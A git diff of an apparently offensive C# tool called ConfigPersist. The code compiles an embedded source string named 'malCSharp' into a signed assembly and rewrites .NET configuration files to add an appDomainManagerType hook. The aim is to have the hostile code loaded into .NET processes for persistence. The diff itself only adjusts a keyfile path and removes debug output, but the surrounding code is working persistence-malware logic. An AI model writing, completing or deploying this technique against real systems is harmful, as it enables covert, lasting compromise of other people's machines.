@@ -11,11 +11,8 @@ using System.Security.Principal;
 
 namespace ConfigPersist
 {
-
     class Program
     {
-
-
         private static bool IsAdminorSystem()
         {
             bool isSystem;
@@ -160,8 +157,8 @@ namespace ConfigPersist
             cp.CompilerOptions = "/optimize";
 
             // Make sure keyfile is named key.snk 
-            // TODO make it so keyfile is just file that contains .snk inside Keyfile folder
-            cp.CompilerOptions = File.Exists("..\\..\\Keyfile\\key.snk") ? "/keyfile:..\\..\\Keyfile\\key.snk" : $"/keyfile:{Environment.CurrentDirectory}\\Keyfile\\key.snk";
+            // TODO allow option to encode file and store as string, write to disk, then delete after compilation.
+            cp.CompilerOptions = File.Exists($"{Environment.CurrentDirectory}\\Keyfile\\key.snk") ? $"/keyfile:{Environment.CurrentDirectory}\\Keyfile\\key.snk" : $"/keyfile:{Environment.CurrentDirectory}\\key.snk";
             cp.IncludeDebugInformation = false;
             CompilerResults cr = objCodeCompiler.CompileAssemblyFromSource(cp, malCSharp);
             var types = cr.CompiledAssembly.GetExportedTypes();
@@ -220,7 +217,6 @@ namespace ConfigPersist
                 XmlDocument doc = new XmlDocument();
                 doc.Load(configpath);
                 XmlNode node = doc.SelectSingleNode("/configuration/runtime");
-                Console.WriteLine($"node is: {node}");
                 XmlElement ele = doc.CreateElement("appDomainManagerType");
                 ele.SetAttribute("value", context ?? "Context.ConfigHooking");
                 node.AppendChild(ele.Clone());
@@ -274,14 +270,12 @@ namespace ConfigPersist
                 };
 
                 // Hours wasted debugging this because it returns 32 bit version of .NET Framework
-                Console.WriteLine(paths);
-
                 foreach (var configPath in paths)
                 {
                     Console.WriteLine($" ConfigPath: {configPath}");
                     FixConfig(configPath, asmFullName, context);
-                    Console.ReadLine();
                 }
+                Console.ReadLine();
             }
             catch (Exception e)
             {
